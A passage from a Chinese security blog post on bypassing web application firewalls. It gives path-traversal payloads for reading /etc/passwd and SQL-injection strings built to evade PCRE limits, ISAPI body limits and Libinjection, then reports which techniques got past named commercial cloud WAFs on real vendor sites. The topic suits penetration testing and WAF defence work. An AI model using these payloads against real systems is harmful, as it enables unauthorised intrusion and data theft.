+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat .?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/.?/etc/passwd</span><br><span class="line">cat /.$@./etc/passwd					//在任何目录都可以读取</span><br></pre></td></tr></table></figure>
+<p>有的开发者过滤检测的是../../ ../../../，emmmmmmm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..//..//..//..//..//..//..//..//..//..//..//..//..//..//   //针对../../过滤</span><br><span class="line">../..//../..//../..//../..//../..//../..//../..//../..//   //针对../../../过滤</span><br></pre></td></tr></table></figure>
+<p>还可以尝试编码</p>
+<blockquote>
+<p>前提是服务器端能够识别此编码并解析</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..%5c/..%5c/..%5c/..%5c/						//url编码</span><br><span class="line">..%255c/..%255c/..%255c/..%255c/			//url二次编码</span><br><span class="line">unicode/UTF-8编码/其他编码</span><br></pre></td></tr></table></figure>
+<p>也可以尝试下这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ..\/..\/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>如果是windows环境,还可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\..\</span><br></pre></td></tr></table></figure>
+<p>Tomcat 路径跳转中允许<code>;</code>符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/..;/..;/</span><br><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure>
+<p>写WAF文件包含规则时，如果检测单一的”../”，误报会非常多，所以WAF文件包含规则通常会检测连续的“../“。根据vfs解析路径的语法，解析到“//”文件路径不变，解析到“/./”文件路径依然。 通过避免连续的”../“，从而绕过WAF文件包含规则。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">././..///./.././/../etc//passwd</span><br></pre></td></tr></table></figure>
+<h4 id="（4）绝对路径绕过"><a href="#（4）绝对路径绕过" class="headerlink" title="（4）绝对路径绕过"></a>（4）绝对路径绕过</h4><p>WAF没有考虑到路径中插入“/./”、“//”对于vfs解析路径是等价的，导致可被绕过。例如 /etc/./passwd 与 /etc/passwd 是等价的。还可以通过组合“/./”、“//”进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc///.//././/passwd</span><br><span class="line">/wtt/../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>利用WAF未检测的协议。PHP 文件包含支持的协议，在渗透测试中，看环境选择可行的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:// — Accessing local filesystem</span><br><span class="line">http:// — Accessing HTTP(s) URLs</span><br><span class="line">ftp:// — Accessing FTP(s) URLs</span><br><span class="line">php:// — Accessing various I/O streams</span><br><span class="line">zlib:// — Compression Streams data:// — Data (RFC 2397)</span><br><span class="line">glob:// — Find pathnames matching pattern</span><br><span class="line">phar:// — PHP Archive</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — Audio streams</span><br><span class="line">expect:// — Process Interaction Streams</span><br></pre></td></tr></table></figure>
+<h3 id="7-XSS"><a href="#7-XSS" class="headerlink" title="7. XSS"></a>7. XSS</h3><p>待补充</p>
+<h3 id="8-第三方组件"><a href="#8-第三方组件" class="headerlink" title="8. 第三方组件"></a>8. 第三方组件</h3><p>一般来说，WAF会用到的第三方组件有PCRE、ISAPI、Libinjection等。</p>
+<h4 id="（1）PCRE"><a href="#（1）PCRE" class="headerlink" title="（1）PCRE"></a>（1）PCRE</h4><p>PCRE在处理正则表达式时，为了防止ReDoS正则表达式拒绝服务攻击，提供了<code>PCRE_EXTRA_MATCH_LIMIT</code>和<code>PCRE_EXTRA_MATCH_LIMIT_RECURSION</code>选项来限制匹配次数。</p>
+<ul>
+<li><p><code>PCRE_EXTRA_MATCH_LIMIT</code>的值默认为100万，可以限制匹配的总次数；</p>
+</li>
+<li><p><code>PCRE_EXTRA_MATCH_LIMIT_RECURSION</code>主要限制匹配递归次数，并不是所有匹配都存在递归，所以该值在小于<code>PCRE_EXTRA_MATCH_LIMIT</code>值时才有意义。</p>
+</li>
+</ul>
+<p>有些WAF为了防止ReDoS都会将<code>PCRE_EXTRA_MATCH_LIMIT</code>设置为比默认值更小的值，加入将WAF过滤SQL语句的正则表达式写成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/UNION.+?SELECT/is</span><br></pre></td></tr></table></figure>
+<p>而此时<code>PCRE_EXTRA_MATCH_LIMIT</code>的值为100万，那么要绕过WAF过滤防护的SQL语句可以写成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/*aaa……a*/select</span><br></pre></td></tr></table></figure>
+<p>这里被注释掉的字符<code>a</code>有100万个，很容易满足<code>PCRE_EXTRA_MATCH_LIMIT</code>的值为100万的限制条件，而且这些字符的数据量大小不到1MB，不会占用太多空间。根据此方法可以绕过很多类似的WAF正则规则。</p>
+<h4 id="（2）ISAPI"><a href="#（2）ISAPI" class="headerlink" title="（2）ISAPI"></a>（2）ISAPI</h4><p>ISAPI是IIS提供的一套编写API的插件，<code>ISAPI filter</code>可以对请求头中的数据进行过滤，<code>ISAPI extension</code>可以获取请求的body数据，对应的原型为<code>HttpExtensionProc(EXTENSION_CONTROL_BLOCK*pECB)</code>。这里可以通过<code>pECB-&gt;lpbData</code>获取到post请求的body部分的数据，但最大只能存储48kb的数据。总的大小可以通过<code>pECB-&gt;cbTotalBytes</code>获取，超过48kb的数据的同步函数调用方式可以通过<code>pECB-&gt;ReadClient(...)</code>获取，异步函数调用方式可以通过<code>pECB-&gt;ServerSupportFunction(...,HSE_REQ_ASYNC_READ_CLIENT,...)</code>获取。</p>
+<p>但是，这样在ISAPI插件的WAF中读取超过48kb的数据会导致后面的ASP获取不了多于48kb的数据，因此很多基于ISAPI的IIS WAF都可以通过把攻击数据放到48kb外而绕过WAF防护。如果某post参数id存在SQL注入，那么我们可以填充48kb的无用数据后再写注入语句，如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=aaa...a&amp;id=1%20union%20all%20select%201,1,1,1@@version,1</span><br></pre></td></tr></table></figure>
+<p>其中，上面的a字符所占用的空间超过了48kb</p>
+<h4 id="（3）Libinjection"><a href="#（3）Libinjection" class="headerlink" title="（3）Libinjection"></a>（3）Libinjection</h4><p>Libinjection被应用于很多WAF中，知名的有modsecurity。因为Libinjection只是对SQL语句进行标签化（token化），然后对被标签化的字符串进行匹配，所以同一种绕过方法通常可以绕过很多SQL注入语句的过滤规则。</p>
+<p>利用不常用的SQL函数可以绕过Libinjection过滤，比如用mod(3,2)代替1的SQL语句可以写为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod(3,2) union select mod(3,2),usr,pwd from user --</span><br></pre></td></tr></table></figure>
+<p>通过使用Fuzz测试技术也可以绕过Libinjection过滤，例如插入<code>1&lt;@</code>到SQL语句中可以绕过Libinjection防护，此方法也可以绕过某些WAF的SQL注入语义检测引擎。相关的Python脚本地址为：<a href="https://waf.ninja/libinjection-fuzz-to-bypass/" target="_blank" rel="noopener">https://waf.ninja/libinjection-fuzz-to-bypass/</a></p>
+<p>通过大括号也可以绕过Libinjection过滤，MySQL支持<code>{identifier expr}</code>这种兼容ODBC的转义写法，对应的可绕过Libinjection过滤的SQL语句如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos;&lt;@=1 or &#123;x (select 1)&#125; --</span><br><span class="line">1 and&#123;`if`updatexml (1,concat (0x3a,(select /*!50000(/*!50000schema_name) from/*!50000information_schema*/.schemata limit 0,1)),1)&#125; --</span><br></pre></td></tr></table></figure>
+<h2 id="八、Google-Dorks-Approach"><a href="#八、Google-Dorks-Approach" class="headerlink" title="八、Google Dorks Approach"></a>八、Google Dorks Approach</h2><p>应对已知WAF的绕过，然后如果都不能用的情况下，可以参考历史payload的一些核心绕过思想稍加修改或补充，可以很大概率继续绕过。</p>
+<p><strong>搜索语法</strong></p>
+<ul>
+<li>Normal search:<br><code>+ waf bypass</code></li>
+<li>Searching for specific version exploits:<br><code>&quot; &quot; (bypass|exploit)</code></li>
+<li>For specific type bypass exploits:<br><code>&quot;&quot; + (bypass|exploit)</code></li>
+<li>On <a href="https://exploit-db.com/" target="_blank" rel="noopener">Exploit DB</a>:<br><code>site:exploit-db.com + bypass</code></li>
+<li>On <a href="https://0day.today/" target="_blank" rel="noopener">0Day Inject0r DB</a>:<br><code>site:0day.today +  (bypass|exploit)</code></li>
+<li>On <a href="https://twitter.com/" target="_blank" rel="noopener">Twitter</a>:<br><code>site:twitter.com + bypass</code></li>
+<li>On <a href="https://pastebin.com/" target="_blank" rel="noopener">Pastebin</a><br><code>site:pastebin.com + bypass</code></li>
+</ul>
+<h1 id="0x05-CASE"><a href="#0x05-CASE" class="headerlink" title="0x05 CASE"></a>0x05 CASE</h1><blockquote>
+<p>因测试各厂商的WAF产品的站点数量较少，测试结果可能会存在少许误差</p>
+</blockquote>
+<h2 id="零、使用说明"><a href="#零、使用说明" class="headerlink" title="零、使用说明"></a>零、使用说明</h2><ol>
+<li><p>过WAF的方法或payload本身就具有时效性，过于滥用会加速这些姿势的消失；</p>
+</li>
+<li><p>最低优先级使用规则方式绕WAF，某些情况下，用一次少一个。</p>
+</li>
+</ol>
+<h2 id="一、云WAF"><a href="#一、云WAF" class="headerlink" title="一、云WAF"></a>一、云WAF</h2><h3 id="1-阿里云"><a href="#1-阿里云" class="headerlink" title="1. 阿里云"></a>1. 阿里云</h3><p><strong>测试站点：</strong></p>
+<ul>
+<li><p>edu.aliyun.com</p>
+</li>
+<li><p>yq.aliyun.com</p>
+</li>
+</ul>
+<p><strong>测试结果：</strong></p>
+<ol>
+<li>CDN绕过</li>
+<li>Pipelining（无回显）</li>
+<li>畸形分块（Apache）</li>
+<li>分块欺骗（Tomcat）</li>
+<li>Content-Type编码+分块编码（大学站点测试ok）</li>
+<li>报错绕过（Apache）</li>
+<li>资源限制</li>
+</ol>
+<h3 id="2-腾讯云"><a href="#2-腾讯云" class="headerlink" title="2. 腾讯云"></a>2. 腾讯云</h3><p><strong>测试站点：</strong></p>
+<ul>
+<li><p>cloud.tencent.com</p>
+</li>
+<li><p>guanjia.qq.com</p>
+</li>
+</ul>
+<p><strong>测试结果：</strong></p>
+<ol>
+<li>CDN绕过</li>
+<li>Pipelining（无回显）</li>
+<li>正常分块（guanjia）</li>
+<li>畸形分块（Apache、Nginx）</li>
+<li>分块欺骗（Tomcat）</li>
+<li>Content-Type编码+分块编码（guanjia）</li>
+<li>报错绕过（Apache）</li>
+<li>静态资源白名单（guanjia）</li>
+</ol>
+<h3 id="3-百度云-Cloudflare"><a href="#3-百度云-Cloudflare" class="headerlink" title="3. 百度云/Cloudflare"></a>3. 百度云/Cloudflare</h3><p><strong>测试站点：</strong></p>
+<ul>
+<li>su.baidu.com（支持pipeline回显）</li>
+<li><a href="http://www.8868.cn" target="_blank" rel="noopener">www.8868.cn</a></li>
+<li><a href="http://www.cloudflare.com" target="_blank" rel="noopener">www.cloudflare.com</a></li>
+</ul>
+<p><strong>测试结果：</strong></p>
+<ol>
+<li>CDN绕过</li>
+<li>Pipelining（无回显）</li>
+<li>畸形分块（Apache）</li>
+<li>分块欺骗（Tomcat）</li>
+<li>Content-Type编码（cloudflare）</li>
+<li>Content-Type编码+分块编码（cloudflare）</li>
+<li>报错绕过（Apache）</li>
+<li>参数溢出（目前仅检测前100个参数）</li>
+<li>资源限制</li>
+</ol>
+<h3 id="4-创宇盾"><a href="#4-创宇盾" class="headerlink" title="4. 创宇盾"></a>4. 创宇盾</h3><p><strong>测试站点：</strong></p>
+<ul>
+<li><p>yunaq.com</p>
+</li>
+<li><p>ichunqiu.com</p>
+</li>
+</ul>
+<p><strong>测试结果：</strong></p>
+<ol>
+<li>CDN绕过</li>
+<li>Pipelining（无回显）</li>
+<li>畸形分块（Apache）</li>
+<li>分块欺骗（Tomcat）</li>
+<li>报错绕过（Apache）</li>
+<li>静态资源白名单</li>
+</ol>
+<h3 id="5-京东云"><a href="#5-京东云" class="headerlink" title="5. 京东云"></a>5. 京东云</h3><p><strong>测试站点：</strong></p>
+<ul>
+<li>jdcloud.com</li>
+</ul>
+<p><strong>测试结果：</strong></p>
+<ol>
+<li>CDN绕过</li>
+<li>Pipelining（无回显）</li>
+<li>正常分块</li>
+<li>畸形分块（Apache、Nginx）</li>
+<li>分块欺骗（Tomcat）</li>
+<li>Content-Type编码</li>
+<li>Content-Type编码+分块编码</li>
+<li>报错绕过（Apache）</li>
+<li>资源限制</li>
+<li>静态资源白名单</li>
+</ol>
+<h3 id="6-奇安信"><a href="#6-奇安信" class="headerlink" title="6. 奇安信"></a>6. 奇安信</h3><ol>
+<li>CDN绕过</li>
+<li>Pipelining（无回显）</li>
+<li>畸形分块（Apache）</li>
+<li>分块欺骗（Tomcat）</li>
+<li>报错绕过（Apache）</li>
+<li>资源限制</li>
+</ol>
+<h2 id="二、软WAF"><a href="#二、软WAF" class="headerlink" title="二、软WAF"></a>二、软WAF</h2><h3 id="1-宝塔-Nginx版"><a href="#1-宝塔-Nginx版" class="headerlink" title="1. 宝塔(Nginx版)"></a>1. 宝塔(Nginx版)</h3><ul>
+<li>参数溢出（目前仅检测前870个参数）</li>
+</ul>
+<h3 id="2-宝塔-Apache版"><a href="#2-宝塔-Apache版" class="headerlink" title="2. 宝塔(Apache版)"></a>2. 宝塔(Apache版)</h3><p>待测试</p>
+<h3 id="3-安全狗"><a href="#3-安全狗" class="headerlink" title="3. 安全狗"></a>3. 安全狗</h3><p>待测试</p>
+<h3 id="4-云锁"><a href="#4-云锁" class="headerlink" title="4. 云锁"></a>4. 云锁</h3><p>待测试</p>
+<h3 id="5-雷池"><a href="#5-雷池" class="headerlink" title="5. 雷池"></a>5. 雷池</h3><p>待测试</p>
+<h3 id="6-Modsecurity"><a href="#6-Modsecurity" class="headerlink" title="6. Modsecurity"></a>6. Modsecurity</h3><p>听说报错不检测，在某些中间件环境下，可以借助各种畸形协议，真实性有待测试。</p>
+<h2 id="三、硬件WAF"><a href="#三、硬件WAF" class="headerlink" title="三、硬件WAF"></a>三、硬件WAF</h2><blockquote>
+<p>测试目标太少，后续遇到时再做补充</p>
+</blockquote>
+<p>与云WAF类似，只是没法通过绕过CDN实现无脑通关</p>
+<h3 id="1-深信服"><a href="#1-深信服" class="headerlink" title="1. 深信服"></a>1. 深信服</h3><p>待测试</p>
+<h3 id="2-奇安信"><a href="#2-奇安信" class="headerlink" title="2. 奇安信"></a>2. 奇安信</h3><p>待测试</p>
+<h3 id="3-天融信"><a href="#3-天融信" class="headerlink" title="3. 天融信"></a>3. 天融信</h3><p>待测试</p>
+<h3 id="4-绿盟"><a href="#4-绿盟" class="headerlink" title="4. 绿盟"></a>4. 绿盟</h3><p>待测试</p>
+<h3 id="5-安恒信息"><a href="#5-安恒信息" class="headerlink" title="5. 安恒信息"></a>5. 安恒信息</h3><p>待测试</p>
+<h3 id="6-启明星辰"><a href="#6-启明星辰" class="headerlink" title="6. 启明星辰"></a>6. 启明星辰</h3><p>待测试</p>
+<h1 id="0x06-WAF为什么可以绕过"><a href="#0x06-WAF为什么可以绕过" class="headerlink" title="0x06 WAF为什么可以绕过"></a>0x06 WAF为什么可以绕过</h1><ul>
+<li>安全、效率、成本之间的平衡，不是规则不够强，只是相对于业务和效率做出了让步</li>
+<li>甲方使用默认配置，不会根据业务特点做专门的防护</li>
+</ul>
+<p>互联网公司中，效率代表产品的易用性和响应时间，往往很难有较大牺牲，成本和安全的组合形式决定了安全产品架构的不同，即便在倾向选择中安全成为首位，WAF产品本身也有痼疾：HTTP协议和业务场景的复杂性导致很难有统一的策略规范，加之WAF抽离于业务代码逻辑以外，这些耦合上的瑕疵很容易成为绕过WAF防护的突破口。</p>
+<p>再者，不管是基于正则匹配还是机器学习，考量WAF的指标永远是相互矛盾的：误报率，漏报率。在安全和效率(业务)的博弈中，没有完美，只有适配，这也就决定了WAF的定位。</p>
+<h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>最好先熟悉各种WAF的产品形态，部署方式，以及对应的一些绕过特点（比如：嵌入式WAF不用考虑协议层绕过，云WAF才有CDN绕过）。</p>
+<p>基本上每个人多少都会知道一些过WAF的思路，同时也有很多人分享过各种思路，这是基本功，但还不够。</p>
+<p>有了基本功还需要实际去实际测试和验证这些思路，要清楚每种思路的环境条件限制和对哪些WAF有效，这样在遇到WAF时，结合目标服务器环境和WAF厂商，可以快速定位当前哪些方法是可用的，或者哪些方法曾经可用且自己未储备新的姿势时，稍加变通（在之前payload基础上加以修改/混淆）即可快速通过。</p>
+<p>另外，如果想更深入和挖掘更多的绕过WAF姿势，还需要多研究协议相关标准文档和解析源码（协议、中间件、T-SQL语法等）。</p>
+<h1 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h1><p>本文内容主要参考了互联网上公开的一些总结和经验，吸收学习然后测试再整合到一起，目标是尽量全面、细节的讲述目前主流绕WAF的思路、方法和限制，感谢如下作者的无私奉献，我只是一名搬运工😂</p>
+<p><a href="https://cshihong.github.io/2020/06/14/WAF基本原理与部署方式/" target="_blank" rel="noopener">WAF基本原理与部署方式</a></p>
+<p><a href="https://www.qiaoyue.net/2019/WAF绕过的捷径与方法/" target="_blank" rel="noopener">WAF绕过的捷径与方法</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/145" target="_blank" rel="noopener">WAF建设运营及AI应用实践</a></p>
+<p><a href="https://www.anquanke.com/post/id/177044" target="_blank" rel="noopener">对过WAF的一些认知</a></p>
+<p><a href="https://xz.aliyun.com/t/15" target="_blank" rel="noopener">WAF攻防研究之四个层次Bypass WAF</a></p>
+<p><a href="https://paper.seebug.org/218/" target="_blank" rel="noopener">我的WafBypass之道（SQL注入篇）</a></p>
+<p><a href="https://zhengbao.wang/从http协议层面和数据库层面绕过waf/" target="_blank" rel="noopener">从http协议层面和数据库层面绕过waf</a></p>
+<p><a href="https://www.cnblogs.com/feizianquan/p/10983442.html" target="_blank" rel="noopener">sql注入100种姿势过waf:waf 了解 — 痱子</a></p>
+<p><a href="https://www.freebuf.com/column/163469.html" target="_blank" rel="noopener">WAF攻防之SQL注入篇</a></p>
+<p><a href="https://blog.csdn.net/wutianxu123/article/details/104260945" target="_blank" rel="noopener">web渗透–64–常见的WAF绕过方法</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9087924.html" target="_blank" rel="noopener">Bypass 360主机卫士SQL注入防御（多姿势）</a></p>
+<p><a href="https://www.aqniu.com/vendor/58154.html" target="_blank" rel="noopener">中国网络安全细分领域矩阵图</a></p>
+<p><a href="https://2018.appsec.eu/presos/Hacker_WAF-Bypass-Techniques_Soroush-Dalili_AppSecEU2018.pptx" target="_blank" rel="noopener">WAF bypass techniques</a></p>
+<p><a href="https://github.com/irsdl/httpninja" target="_blank" rel="noopener">HTTP.ninja</a></p>
+<p><a href="https://xz.aliyun.com/t/6422#toc-3" target="_blank" rel="noopener">Awesome-WAF</a></p>
+<p><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener">Web Application Firewall (WAF) Evasion Techniques</a></p>
+<p><a href="https://juejin.im/post/6844903991948771342" target="_blank" rel="noopener">揭秘阿里云WAF背后神秘的AI智能防御体系</a></p>
+<p><a href="http://blog.nsfocus.net/web-anomaly-detection-based-machine-learning/" target="_blank" rel="noopener">基于机器学习的WEB异常检测</a></p>
+<p>同时，欢迎各位同学补充学习过程中发现的新姿势。</p>
+<p>本篇测试结果主要以云WAF的mysql注入为主，后续会根据需求继续补充针对其他数据库的特性，以及其他漏洞类型的绕过。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WAF/" rel="tag"># WAF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/12/ByPass阿里云盾-SQL注入篇/" rel="next" title="ByPass阿里云盾-SQL注入篇">
+                <i class="fa fa-chevron-left"></i> ByPass阿里云盾-SQL注入篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">EkEk</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/JeremyEkEk" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jeremy.0394@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/anbus/p/10046695.html" title="ArcticShell" target="_blank">ArcticShell</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/Micropoor/Micro8" title="Micropoor亮神" target="_blank">Micropoor亮神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/zwjzqqb/article/list/7" title="VincentQB" target="_blank">VincentQB</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/PyxYuYu/MyBlog" title="PyxYuYu" target="_blank">PyxYuYu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://3gstudent.github.io/3gstudent.github.io/" title="三好学生" target="_blank">三好学生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.inksec.cn/archives/page/2/" title="阿墨" target="_blank">阿墨</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.barradell-johns.com/" title="JACK" target="_blank">JACK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adsecurity.org/" title="AD安全" target="_blank">AD安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.fuzzysecurity.com" title="FuzzySecurity" target="_blank">FuzzySecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexacorn.com/" title="Hexacorn" target="_blank">Hexacorn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://evi1cg.me/" title="Evi1cg" target="_blank">Evi1cg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://b404.xyz/" title="Jirairya" target="_blank">Jirairya</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://payloads.online/" title="倾旋" target="_blank">倾旋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://times0ng.github.io/" title="Times0g" target="_blank">Times0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://firstlove2016.cn/" title="初恋的技术分享" target="_blank">初恋的技术分享</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.netwrix.com/" title="netwrix" target="_blank">netwrix</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://klionsec.github.io/" title="klion" target="_blank">klion</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jivoi.github.io/archive/" title="EK" target="_blank">EK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://securityer.lofter.com/view" title="走过岁月" target="_blank">走过岁月</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.webbaozi.com/" title="baozi" target="_blank">baozi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.myh0st.cn/" title="信安之路" target="_blank">信安之路</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jdrops.dropsec.xyz/" title="Jdrops" target="_blank">Jdrops</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exploit.kitploit.com/" title="exploit collector" target="_blank">exploit collector</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zjw.dropsec.xyz/" title="Hello_C" target="_blank">Hello_C</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cxsecurity.com/dorks" title="cxsecurity" target="_blank">cxsecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pentest.blog/" title="pentest" target="_blank">pentest</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://rcoil.me/" title="rcoil" target="_blank">rcoil</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://dayu.ink/" title="Dayu" target="_blank">Dayu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://04z.net/" title="04z" target="_blank">04z</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.attackdebris.com/" title="attsckdebris" target="_blank">attsckdebris</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
